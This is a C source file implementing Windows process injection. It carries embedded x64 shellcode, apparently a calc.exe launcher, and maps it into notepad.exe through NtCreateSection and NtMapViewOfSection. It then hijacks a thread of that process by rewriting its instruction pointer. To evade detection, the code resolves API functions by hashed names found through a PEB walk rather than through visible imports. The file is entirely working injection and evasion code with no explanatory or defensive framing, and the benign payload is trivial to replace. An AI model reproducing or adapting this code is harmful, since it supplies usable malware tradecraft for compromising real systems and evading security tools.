#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <winternl.h>
#include <string.h>
#include <Psapi.h>

unsigned char shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
    0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,
    0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
    0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,
    0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,
    0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,
    0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
    0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,
    0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
    0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,
    0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,
    0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
    0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,
    0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
    0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,
    0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
};

const SIZE_T shellcode_len = sizeof(shellcode);



#define Kernel32dll_hash 2666974377
#define uaw_wcslen_hash  4252404561

#define ntdll_hash 1273438369
#define NtCreateSection_Hash 4170957444
#define NtMApViewOfSection_Hash 1763167902

#define INI_HASH 1337
int DBJ2(PCHAR TargetString){
    ULONG HASH = INI_HASH;
    int C;

    while(C = *TargetString++){
        HASH = ((HASH << 5) + HASH) + C;
    }
    return HASH;
}

FARPROC GetProcAddReplacement(HMODULE HModule, DWORD TargetAPIHash){
    PBYTE PBase = (PBYTE)HModule;

    PIMAGE_DOS_HEADER PImageDosHeaders = (PIMAGE_DOS_HEADER)PBase;
    if(PImageDosHeaders->e_magic != IMAGE_DOS_SIGNATURE){
        return NULL;
    }
    
    PIMAGE_NT_HEADERS PImageNtHeaders = (PIMAGE_NT_HEADERS)(PBase + PImageDosHeaders->e_lfanew);
    if(PImageNtHeaders -> Signature != IMAGE_NT_SIGNATURE){
        return NULL;
    }
    
    IMAGE_OPTIONAL_HEADER ImgOptHeaders = PImageNtHeaders->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY PImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(PBase + ImgOptHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray 	= (PDWORD)(PBase + PImageExportDirectory->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(PBase + PImageExportDirectory->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(PBase + PImageExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < PImageExportDirectory->NumberOfNames; i++){
	    CHAR* pFunctionName		= (CHAR*)(PBase + FunctionNameArray[i]);
        WORD wFunctionOrdinal = FunctionOrdinalArray[i];
        PVOID pFunctionAddress = (PVOID)(PBase + FunctionAddressArray[wFunctionOrdinal]);
	    
        int hashedFunc = DBJ2(pFunctionName);
	    if(hashedFunc == TargetAPIHash){
            return (FARPROC)pFunctionAddress;
        }
        
    }
    return NULL;
}

LPCWSTR GetFileNameFromPath(LPCWSTR FullPath){
    LPCWSTR LastSlash = wcsrchr(FullPath, L'\\');
    if(LastSlash != NULL){
        return LastSlash+1;
    }
    return FullPath;
}

HMODULE GetModuleHandleCustom(DWORD TargetModuleHash){
    PPEB pPebvar = (PEB*)(__readgsqword(0x60));
    PPEB_LDR_DATA pLDR = (PPEB_LDR_DATA)(pPebvar->Ldr);
    PLIST_ENTRY PListHead = &(pLDR->InMemoryOrderModuleList);

    PLIST_ENTRY PCurrent = PListHead->Flink;
    while(PCurrent != PListHead){

        PLDR_DATA_TABLE_ENTRY pDTE = CONTAINING_RECORD(
            PCurrent,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );



        if(pDTE->FullDllName.Length > 0 && pDTE->FullDllName.Buffer != 0){
            USHORT cch = pDTE->FullDllName.Length/sizeof(WCHAR);

            PWCHAR ModulePath = (PWCHAR)malloc((cch+1)*sizeof(WCHAR));
            
            if(ModulePath == NULL){
                PCurrent = PCurrent->Flink;
                continue;
            }
            
            wcsncpy(ModulePath, pDTE->FullDllName.Buffer, cch);
            ModulePath[cch] = L'\0';
            CharLowerW(ModulePath);
            LPCWSTR ModuleFileName = GetFileNameFromPath(ModulePath);

            char ModuleNameA[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, ModuleFileName, -1, ModuleNameA, MAX_PATH, NULL, NULL);
            DWORD HashedModule = DBJ2(ModuleNameA);
            if(TargetModuleHash == HashedModule){
                free(ModulePath);
                return (HMODULE)(pDTE->DllBase);
            }
            free(ModulePath);
        }
        PCurrent = PCurrent->Flink;
    }
    return NULL;
}


typedef NTSTATUS(NTAPI *NtCreateSection_t)(
    /* OUT */ PHANDLE SectionHandle,
    /* IN */ ACCESS_MASK DesiredAccess,
    /* IN, optional */ PVOID ObjectAttributes,
    /* IN, optional */ PLARGE_INTEGER MaximumSize,
    /* IN */ ULONG SectionPageProtections,
    /* IN */ ULONG AllocationAttributes,
    /* IN, optional */ HANDLE FileHandle
);

typedef NTSTATUS(NTAPI *NtMapViewOfSection_t)(
    /* IN */ HANDLE SectionHandle,
    /* IN */ HANDLE ProcessHandle,
    /* IN, OUT */ PVOID *BaseAddress,
    /* IN */ ULONG_PTR ZeroBits,
    /* IN */ SIZE_T CommitSize,
    /* in, out, optional */ PLARGE_INTEGER SectionOffset,
    /* IN, OUT */ PSIZE_T ViewSize,
    /* IN */ DWORD InheritDisposition,
    /* IN */ ULONG AllocationType,
    /* IN */ ULONG PageProtection
);

DWORD FindPID(const char* target){
    HANDLE HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe)};
    DWORD pid;
    if(Process32First(HSnapshot, &pe)){
        do{
            if(_stricmp(pe.szExeFile, target) == 0){
                pid = pe.th32ProcessID;
                break;
            }
        }while(Process32Next(HSnapshot, &pe));
    }
    CloseHandle(HSnapshot);
    return pid;
}

DWORD findTID(DWORD pid){
    HANDLE HSnapshotT = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD tid = 0;
    THREADENTRY32 te = { .dwSize = sizeof(te)};
    if(Thread32First(HSnapshotT, &te)){
        do{
            if(te.th32OwnerProcessID == pid){
                tid = te.th32ThreadID;
                break;
            }
        }while(Thread32Next(HSnapshotT, &te));
    }
    CloseHandle(HSnapshotT);
    return tid;
}

int main(){
    const char TargetProcess[]= "notepad.exe";
    DWORD TargetPID = FindPID(TargetProcess);
    DWORD TargetTID = findTID(TargetPID);
    PVOID LocalMapping = NULL;
    PVOID RemoteMapping = NULL;
    HANDLE HSection;
    SIZE_T size = 4096;
    LARGE_INTEGER SecSize ={size};
    HANDLE HandleToTargetProc = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|SYNCHRONIZE|PROCESS_QUERY_INFORMATION, FALSE, TargetPID);
    HMODULE nt = GetModuleHandleCustom(ntdll_hash);
    NtCreateSection_t PointerToNtCS = (NtCreateSection_t)GetProcAddReplacement(nt, 4170957444);
    NtMapViewOfSection_t PointerToNtMVS = (NtMapViewOfSection_t)GetProcAddReplacement(nt, 1763167902);

    if(PointerToNtCS(&HSection, SECTION_MAP_EXECUTE|SECTION_MAP_READ|SECTION_MAP_WRITE, NULL, (PLARGE_INTEGER)&SecSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)){
        printf("NtCS Failed");
        return -1;
    }

    if(PointerToNtMVS(HSection, GetCurrentProcess(), &LocalMapping, 0, 0, NULL, &size, 2, 0, PAGE_READWRITE)){
        printf("Local NtMVS failed");
        return -1;
    }
    memcpy(LocalMapping, shellcode, shellcode_len);

    if(PointerToNtMVS(HSection, HandleToTargetProc, &RemoteMapping, 0, 0, NULL, &size, 1, 0, PAGE_EXECUTE_READ)){
        printf("Remote NtMVS failed");
        return -1;
    }

    HANDLE TargetThreadHandle = OpenThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, FALSE, TargetTID);
    SuspendThread(TargetThreadHandle);
    CONTEXT ThreadCTX = {.ContextFlags = CONTEXT_CONTROL};

    if(!GetThreadContext(TargetThreadHandle, &ThreadCTX)){
        printf("GetThreadContext Failed");
        return -1;
    }
    ThreadCTX.Rip = (DWORD64)RemoteMapping;

    if(!SetThreadContext(TargetThreadHandle, &ThreadCTX)){
        printf("SetThreadContext Failed");
        return -1;
    }
    ResumeThread(TargetThreadHandle);

    CloseHandle(HSection);
    CloseHandle(HandleToTargetProc);

    return 0;
}